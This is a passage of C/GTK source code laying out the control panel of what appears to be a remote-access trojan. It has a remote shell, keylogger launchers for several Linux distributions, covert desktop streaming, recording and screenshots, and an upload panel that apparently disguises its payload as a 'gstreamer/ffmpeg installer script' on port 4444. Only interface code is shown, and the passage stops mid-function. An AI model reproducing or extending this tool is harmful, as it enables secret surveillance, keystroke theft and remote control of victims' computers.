    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows10_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Cmd text labels */
    windows7_label_watch = gtk_label_new(NULL);
    windows7_label_record = gtk_label_new(NULL);
    windows7_label_screenshot = gtk_label_new(NULL);
    windows7_label_multi_screenshot = gtk_label_new(NULL);

    windows8_label_watch = gtk_label_new(NULL);
    windows8_label_record = gtk_label_new(NULL);
    windows8_label_screenshot = gtk_label_new(NULL);
    windows8_label_multi_screenshot = gtk_label_new(NULL);

    windows10_label_watch = gtk_label_new(NULL);
    windows10_label_record = gtk_label_new(NULL);
    windows10_label_screenshot = gtk_label_new(NULL);
    windows10_label_multi_screenshot = gtk_label_new(NULL);

    gtk_label_set_markup(GTK_LABEL(windows7_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows7_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows7_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows7_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(windows8_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows8_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows8_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows8_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(windows10_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(windows10_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(windows10_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(windows10_label_multi_screenshot), utf8_multi_screenshot);

    /* Windows7 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_label_multi_screenshot, 40, 115);

    /* Windows8 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_label_multi_screenshot, 40, 115);

    /* Windows10 tab labels */
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(windows_zone[2]), windows10_label_multi_screenshot, 40, 115);

    g_free(utf8_watch);
    g_free(utf8_record);
    g_free(utf8_screenshot);
    g_free(utf8_multi_screenshot);

    /* Frame 4 (Remote Shell) */
    frame[4] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[4]), "- Remote Shell - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[4]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[4]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[4], 540, 200);
    gtk_fixed_put(GTK_FIXED(zone), frame[4], 250, 220);

    /* GtkEntry for enter the commands */
    rs_entry = gtk_entry_new_with_max_length(256);
    gtk_entry_set_text(GTK_ENTRY(rs_entry), "Enter a command here");
    gtk_widget_set_size_request (rs_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_entry, 270, 260);

    /* Start Remote Shell Button */
    rs_start =  gtk_button_new_with_label("Start the Remote Shell");
    gtk_widget_set_size_request(rs_start, 180, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_start, 300, 310);
    g_signal_connect(G_OBJECT(rs_start), "clicked", G_CALLBACK(start_remote_shell), NULL);

    /* Send button */
    rs_send = gtk_button_new_with_label("Send");
    gtk_widget_set_size_request(rs_send, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), rs_send, 520, 260);
    g_signal_connect(G_OBJECT(rs_send), "clicked", G_CALLBACK(send_cmd), rs_entry);

    /* Frame 5 (KeyLogger) */
    frame[5] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[5]), "- KeyLogger - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[5]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[5]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[5], 230, 370);
    gtk_fixed_put(GTK_FIXED(zone), frame[5], 10, 220);

    run_keylogger = gtk_button_new_with_label("Ubuntu Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 260);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(ubuntu_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Mint Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 300);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(mint_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Debian Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 340);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(debian_run_the_keylogger), NULL);

    run_keylogger = gtk_button_new_with_label("Kali Keylogger");
    gtk_widget_set_size_request(run_keylogger, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), run_keylogger, 50, 380);
    g_signal_connect(G_OBJECT(run_keylogger), "clicked", G_CALLBACK(kali_run_the_keylogger), NULL);

    log_file = gtk_button_new_with_label("Logs file");
    gtk_widget_set_size_request(log_file, 150, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_file, 50, 530);
    g_signal_connect(G_OBJECT(log_file), "clicked", G_CALLBACK(open_log_file), NULL);

    gtk_widget_show_all(main_win);

    return;

}

/* Windows Skin N°2 */
void set_skin_number_two(GtkWidget *zone)
{
    /* General Vars */
    GtkWidget *frame[6] = {NULL};
    GtkWidget *sub_frame[2] = {NULL};

    GtkWidget *background = NULL;

    char *IP = NULL;

    /* Disconnect from server */
    GtkWidget *ubuntu_disconnect = NULL;
    GtkWidget *mint_disconnect = NULL;
    GtkWidget *debian_disconnect = NULL;
    GtkWidget *kali_disconnect = NULL;

    /* text view on the left side */
    GtkWidget *scrollbar = NULL;

    /* Frame 0 Vars */
    GtkWidget *ip_server = NULL;
    GtkWidget *port_server = NULL;
    GtkWidget *IP_button = NULL;
    GtkWidget *port_button = NULL;

    //GtkWidget *log_entry = NULL;
    GtkWidget *log_button = NULL;
    GtkWidget *upload_button = NULL;

    GtkWidget *skin_1 = NULL;
    GtkWidget *skin_2 = NULL;
    GtkWidget *skin_3 = NULL;
    GtkWidget *credits = NULL;

    /* Frame 1 Vars */

    /* Sub Frame 0 Vars */
    GtkWidget *distrib_zone[3] = {NULL};
    GtkWidget *note_book = {NULL};
    GtkWidget *tab_label[3] = {NULL};

    gchar *ubuntu_tab_label = NULL;
    gchar *kali_tab_label = NULL;
    gchar *mint_tab_label = NULL;
    gchar *debian_tab_label = NULL;

    /* Sub Frame 1 Vars */
    GtkWidget *windows_zone[3] = {NULL};

    GtkWidget *windows_note_book = {NULL};
    GtkWidget *windows_tab_label[3] = {NULL};

    gchar *windows7_tab_label = NULL;
    gchar *windows8_tab_label = NULL;
    gchar *windows10_tab_label = NULL;

    /* Windows tab vars */
    GtkWidget *windows7_button[3] = {NULL};
    GtkWidget *windows8_button[3] = {NULL};
    GtkWidget *windows10_button[3] = {NULL};

    /* Windows7 Labels Vars */
    GtkWidget *windows7_label_watch = NULL;
    GtkWidget *windows7_label_record = NULL;
    GtkWidget *windows7_label_screenshot = NULL;
    GtkWidget *windows7_label_multi_screenshot = NULL;

    /* Windows8 Labels Vars */
    GtkWidget *windows8_label_watch = NULL;
    GtkWidget *windows8_label_record = NULL;
    GtkWidget *windows8_label_screenshot = NULL;
    GtkWidget *windows8_label_multi_screenshot = NULL;

    /* Windows10 Labels Vars */
    GtkWidget *windows10_label_watch = NULL;
    GtkWidget *windows10_label_record = NULL;
    GtkWidget *windows10_label_screenshot = NULL;
    GtkWidget *windows10_label_multi_screenshot = NULL;

    /* Remote shell vars */
    GtkWidget *rs_entry = NULL;
    GtkWidget *rs_send = NULL;
    GtkWidget *rs_start = NULL;

    /* Keylogger Vars */
    GtkWidget *run_keylogger = NULL;
    GtkWidget *log_file = NULL;

    /* Labels Vars */
    GtkWidget *ubuntu_label_watch = NULL;
    GtkWidget *ubuntu_label_record = NULL;
    GtkWidget *ubuntu_label_screenshot = NULL;
    GtkWidget *ubuntu_label_multi_screenshot = NULL;

    GtkWidget *mint_label_watch = NULL;
    GtkWidget *mint_label_record = NULL;
    GtkWidget *mint_label_screenshot = NULL;
    GtkWidget *mint_label_multi_screenshot = NULL;

    GtkWidget *debian_label_watch = NULL;
    GtkWidget *debian_label_record = NULL;
    GtkWidget *debian_label_screenshot = NULL;
    GtkWidget *debian_label_multi_screenshot = NULL;

    GtkWidget *kali_label_watch = NULL;
    GtkWidget *kali_label_record = NULL;
    GtkWidget *kali_label_screenshot = NULL;
    GtkWidget *kali_label_multi_screenshot = NULL;

    gchar *utf8_watch = NULL;
    gchar *utf8_record = NULL;
    gchar *utf8_screenshot = NULL;
    gchar *utf8_multi_screenshot = NULL;

    /* Background uni color image */
    background = gtk_image_new_from_file("IMG/white-background.jpg");
    gtk_fixed_put(GTK_FIXED(zone), background, 0, 0);

    /* Frame 2 (Text_View) */
    frame[2] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[2]), "- Logs - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[2]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[2]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[2], 540, 160);
    gtk_fixed_put(GTK_FIXED(zone), frame[2], 250, 430);

    /* scrolled window on the side of the windows */
    scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_fixed_put(GTK_FIXED(zone), scrollbar, 260, 450);
    gtk_widget_set_size_request(scrollbar, 520, 130);

    /* Side window (log) */
    text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(scrollbar), text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(text_view, 320, 400);

    /* Frame 0 (Upload) */
    frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[0]), "- Upload / install - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[0]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[0], 540, 200);
    gtk_fixed_put(GTK_FIXED(zone), frame[0], 250, 10);

    log_entry = gtk_entry_new_with_max_length(40);
    gtk_entry_set_text(GTK_ENTRY(log_entry), "gstreamer/ffmpeg installer script");
    gtk_widget_set_size_request(log_entry, 240, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_entry, 270, 150);

    ip_server = gtk_entry_new_with_max_length(15);
    gtk_entry_set_text(GTK_ENTRY(ip_server), "Server IP");
    gtk_widget_set_size_request(ip_server, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone), ip_server, 270, 100);

    port_server = gtk_entry_new_with_max_length(5);
    gtk_entry_set_text(GTK_ENTRY(port_server), "4444");
    gtk_widget_set_size_request(port_server, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), port_server, 430, 100);

    IP_button = gtk_button_new_with_label("Set Server IP");
    gtk_widget_set_size_request(IP_button, 130, 30);
    gtk_fixed_put(GTK_FIXED(zone), IP_button, 270 , 50);
    g_signal_connect(G_OBJECT(IP_button), "clicked", G_CALLBACK(get_server_ip), ip_server);

    port_button = gtk_button_new_with_label("Set Port");
    gtk_widget_set_size_request(port_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), port_button, 430, 50);
    g_signal_connect(G_OBJECT(port_button), "clicked", G_CALLBACK(get_server_port), port_server);

    log_button = gtk_button_new_with_label("Browse");
    gtk_widget_set_size_request(log_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), log_button, 520 , 150);
    g_signal_connect(G_OBJECT(log_button), "clicked", G_CALLBACK(open_file), log_entry);

    upload_button = gtk_button_new_with_label("Install");
    gtk_widget_set_size_request(upload_button, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), upload_button, 640 , 150);
    g_signal_connect(G_OBJECT(upload_button), "clicked", G_CALLBACK(upload), NULL);

    skin_1 = gtk_button_new_with_label("Set Skin N°1");
    gtk_widget_set_size_request(skin_1, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_1, 550 , 50);
    g_signal_connect(G_OBJECT(skin_1), "clicked", G_CALLBACK(cb_set_skin_1), zone);

    skin_2 = gtk_button_new_with_label("Set Skin N°2");
    gtk_widget_set_size_request(skin_2, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_2, 550 , 100);
    //g_signal_connect(G_OBJECT(skin_2), "clicked", G_CALLBACK(cb_set_skin_2), zone);

    skin_3 = gtk_button_new_with_label("Set Skin N°3");
    gtk_widget_set_size_request(skin_3, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), skin_3, 670 , 50);
    g_signal_connect(G_OBJECT(skin_3), "clicked", G_CALLBACK(cb_set_skin_3), zone);

    credits = gtk_button_new_with_label("Credits");
    gtk_widget_set_size_request(credits, 100, 30);
    gtk_fixed_put(GTK_FIXED(zone), credits, 670 , 100);
    //g_signal_connect(G_OBJECT(credits), "clicked", G_CALLBACK(cb_set_skin_2), zone);

    /* Frame 1 (Command) */
    frame[1] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[1]), "- Execute a Command - ");
    gtk_frame_set_label_align(GTK_FRAME(frame[1]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[1]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(frame[1], 450, 580);
    gtk_fixed_put(GTK_FIXED(zone), frame[1], 800, 10);

    /* Sub Frame 0 (Ubuntu Commands) */
    sub_frame[0] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(sub_frame[0]), NULL);
    gtk_frame_set_label_align(GTK_FRAME(sub_frame[0]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(sub_frame[0]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(sub_frame[0], 410, 250);
    gtk_fixed_put(GTK_FIXED(zone), sub_frame[0], 820, 50);

    /* Creating zone for each tabs of the sub frame */
    distrib_zone[0] = gtk_fixed_new();
    distrib_zone[1] = gtk_fixed_new();
    distrib_zone[2] = gtk_fixed_new();
    distrib_zone[3] = gtk_fixed_new();

    /*  Creating tabs */
    note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(sub_frame[0]), note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(note_book), GTK_POS_TOP);
    //gtk_notebook_set_scrollable(GTK_NOTEBOOK(note_book), TRUE);

    ubuntu_tab_label    = g_strdup_printf("Ubuntu 16.04");
    mint_tab_label      = g_strdup_printf("Mint 19");
    debian_tab_label    = g_strdup_printf("Debian 9");
    kali_tab_label      = g_strdup_printf("Kali Linux 2.0");

    tab_label[0] = gtk_label_new(ubuntu_tab_label);
    tab_label[1] = gtk_label_new(mint_tab_label);
    tab_label[2] = gtk_label_new(debian_tab_label);
    tab_label[3] = gtk_label_new(kali_tab_label);

    /* Insert tab pages */
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[0], tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[1], tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[2], tab_label[2]);
    gtk_notebook_append_page(GTK_NOTEBOOK(note_book), distrib_zone[3], tab_label[3]);

    /* Create command text labels */
    ubuntu_label_watch = gtk_label_new(NULL);
    ubuntu_label_record = gtk_label_new(NULL);
    ubuntu_label_screenshot = gtk_label_new(NULL);
    ubuntu_label_multi_screenshot = gtk_label_new(NULL);

    mint_label_watch = gtk_label_new(NULL);
    mint_label_record = gtk_label_new(NULL);
    mint_label_screenshot = gtk_label_new(NULL);
    mint_label_multi_screenshot = gtk_label_new(NULL);

    debian_label_watch = gtk_label_new(NULL);
    debian_label_record = gtk_label_new(NULL);
    debian_label_screenshot = gtk_label_new(NULL);
    debian_label_multi_screenshot = gtk_label_new(NULL);

    kali_label_watch = gtk_label_new(NULL);
    kali_label_record = gtk_label_new(NULL);
    kali_label_screenshot = gtk_label_new(NULL);
    kali_label_multi_screenshot = gtk_label_new(NULL);

    utf8_watch = g_locale_to_utf8("<span foreground=\"#000000\">Watch desktop on streamming.</span>\n", -1, NULL, NULL, NULL);
    utf8_record = g_locale_to_utf8("<span foreground=\"#000000\">Record desktop during n seconds.</span>\n", -1, NULL, NULL, NULL);
    utf8_screenshot = g_locale_to_utf8("<span foreground=\"#000000\">Take a screenshot.</span>\n", -1, NULL, NULL, NULL);
    utf8_multi_screenshot = g_locale_to_utf8("<span foreground=\"#000000\">Take multiples screenshots in n secondes.</span>\n", -1, NULL, NULL, NULL);

    gtk_label_set_markup(GTK_LABEL(ubuntu_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(ubuntu_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(mint_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(mint_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(mint_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(mint_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(debian_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(debian_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(debian_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(debian_label_multi_screenshot), utf8_multi_screenshot);

    gtk_label_set_markup(GTK_LABEL(kali_label_watch), utf8_watch);
    gtk_label_set_markup(GTK_LABEL(kali_label_record), utf8_record);
    gtk_label_set_markup(GTK_LABEL(kali_label_screenshot), utf8_screenshot);
    gtk_label_set_markup(GTK_LABEL(kali_label_multi_screenshot), utf8_multi_screenshot);

    /* Ubuntu tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_label_multi_screenshot, 40, 115);

    /* Mint tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_label_multi_screenshot, 40, 115);

    /* Debian tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_label_multi_screenshot, 40, 115);

    /* Kali tab labels */
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_watch, 40, 25);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_record, 40, 55);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_screenshot, 40, 85);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_label_multi_screenshot, 40, 115);

    /* Ubuntu tab */
    ubuntu_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[0] , 10 , 20);
    g_signal_connect(G_OBJECT(ubuntu_button[0] ), "toggled", G_CALLBACK(cb_ubuntu_watch), IP);

    ubuntu_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(ubuntu_button[1]), "toggled", G_CALLBACK(cb_ubuntu_record), NULL);

    ubuntu_button[2]  = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(ubuntu_button[2]), "toggled", G_CALLBACK(cb_ubuntu_screenshot), NULL);

    ubuntu_button[3]  = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(ubuntu_button[3]), "toggled", G_CALLBACK(cb_ubuntu_mutli_screenshot), NULL);

    /* Close server connection  */

    ubuntu_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(ubuntu_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[0]), ubuntu_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(ubuntu_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    mint_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(mint_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(mint_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    debian_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(debian_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(debian_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    kali_disconnect = gtk_button_new_with_label("Disconnect");
    gtk_widget_set_size_request(kali_disconnect, 150, 30);
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_disconnect, 120 , 155);
    g_signal_connect(G_OBJECT(kali_disconnect), "clicked", G_CALLBACK(cb_close_connection), NULL);

    /* Mint tab */
    mint_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(mint_button[0]), "toggled", G_CALLBACK(cb_mint_watch), IP);

    mint_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(mint_button[1]), "toggled", G_CALLBACK(cb_mint_record), NULL);

    mint_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(mint_button[2]), "toggled", G_CALLBACK(cb_mint_screenshot), NULL);

    mint_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[1]), mint_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(mint_button[3]), "toggled", G_CALLBACK(cb_mint_mutli_screenshot), NULL);

    /* Debian tab */
    debian_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(debian_button[0]), "toggled", G_CALLBACK(cb_debian_watch), IP);

    debian_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(debian_button[1]), "toggled", G_CALLBACK(cb_debian_record), NULL);

    debian_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(debian_button[2]), "toggled", G_CALLBACK(cb_debian_screenshot), NULL);

    debian_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[2]), debian_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(debian_button[3]), "toggled", G_CALLBACK(cb_debian_mutli_screenshot), NULL);

    /* Kali tab */
    kali_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[0], 10 , 20);
    g_signal_connect(G_OBJECT(kali_button[0]), "toggled", G_CALLBACK(cb_kali_watch), IP);

    kali_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[1], 10 , 50);
    g_signal_connect(G_OBJECT(kali_button[1]), "toggled", G_CALLBACK(cb_kali_record), NULL);

    kali_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[2], 10 , 80);
    g_signal_connect(G_OBJECT(kali_button[2]), "toggled", G_CALLBACK(cb_kali_screenshot), NULL);

    kali_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(distrib_zone[3]), kali_button[3], 10 , 110);
    g_signal_connect(G_OBJECT(kali_button[3]), "toggled", G_CALLBACK(cb_kali_mutli_screenshot), NULL);

    /* Sub frame 1 (Windows cmds) */
    sub_frame[1] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(sub_frame[1]), NULL);
    gtk_frame_set_label_align(GTK_FRAME(sub_frame[1]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(sub_frame[1]), GTK_SHADOW_OUT);

    gtk_widget_set_usize(sub_frame[1], 410, 250);
    gtk_fixed_put(GTK_FIXED(zone), sub_frame[1], 820, 320);

    /* Creating zone for each tabs of the windows sub frame */
    windows_zone[0] = gtk_fixed_new();
    windows_zone[1] = gtk_fixed_new();
    windows_zone[2] = gtk_fixed_new();

    /*  Creating tabs */
    windows_note_book = gtk_notebook_new();
    gtk_container_add(GTK_CONTAINER(sub_frame[1]), windows_note_book);
    gtk_notebook_set_tab_pos(GTK_NOTEBOOK(windows_note_book), GTK_POS_TOP);
    //gtk_notebook_set_scrollable(GTK_NOTEBOOK(windows_note_book), TRUE);

    windows7_tab_label  = g_strdup_printf("Windows 7");
    windows8_tab_label  = g_strdup_printf("Windows 8");
    windows10_tab_label = g_strdup_printf("Windows 10");

    windows_tab_label[0] = gtk_label_new(windows7_tab_label);
    windows_tab_label[1] = gtk_label_new(windows8_tab_label);
    windows_tab_label[2] = gtk_label_new(windows10_tab_label);

    /* Insert tab pages */
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[0], windows_tab_label[0]);
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[1], windows_tab_label[1]);
    gtk_notebook_append_page(GTK_NOTEBOOK(windows_note_book), windows_zone[2], windows_tab_label[2]);

    /* Windows 7 tab */
    windows7_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[2] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[2], 10 , 80);
    //g_signal_connect(G_OBJECT(screenshot_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows7_button[3] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[0]), windows7_button[3], 10 , 110);
    //g_signal_connect(G_OBJECT(screenshot_kali), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    /* Windows 8 tab */
    windows8_button[0] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[0], 10 , 20);
    //g_signal_connect(G_OBJECT(watch_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[1] = gtk_check_button_new();
    gtk_fixed_put(GTK_FIXED(windows_zone[1]), windows8_button[1], 10 , 50);
    //g_signal_connect(G_OBJECT(record_fedora), "toggled", G_CALLBACK(set_ubuntu_cmd), NULL);

    windows8_button[2] = gtk_check_button_new();
